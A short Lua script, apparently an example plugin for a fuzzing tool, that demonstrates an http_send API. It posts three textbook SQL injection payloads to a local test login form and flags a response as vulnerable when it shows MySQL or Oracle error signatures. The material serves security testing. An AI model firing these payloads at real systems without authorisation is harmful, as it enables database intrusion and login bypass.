-- Example Active PoC: SQL Injection Test
-- This script demonstrates the http_send API for active testing

function run()
    local payloads = {
        "' OR '1'='1",
        "admin' --",
        "1' UNION SELECT NULL--"
    }
    
    for _, payload in ipairs(payloads) do
        print("[*] Testing payload: " .. payload)
        
        local resp = http_send({
            method = "POST",
            url = "http://testsite.local/login",
            body = "username=" .. payload .. "&password=test",
            headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded",
                ["User-Agent"] = "DirFuzz-PoC/1.0"
            }
        })
        
        if resp.error then
            print("[!] Error: " .. resp.error)
        else
            print(string.format("[+] Status: %d | Time: %dms | Size: %d",
                resp.status_code,
                resp.response_time,
                string.len(resp.body)))
            
            -- Check for SQL error signatures
            if string.find(resp.body, "SQL syntax") or 
               string.find(resp.body, "mysql_") or
               string.find(resp.body, "ORA-") then
                print("[!] VULNERABLE: SQL error detected!")
                print(resp.body:sub(1, 200))
            end
        end
    end
end
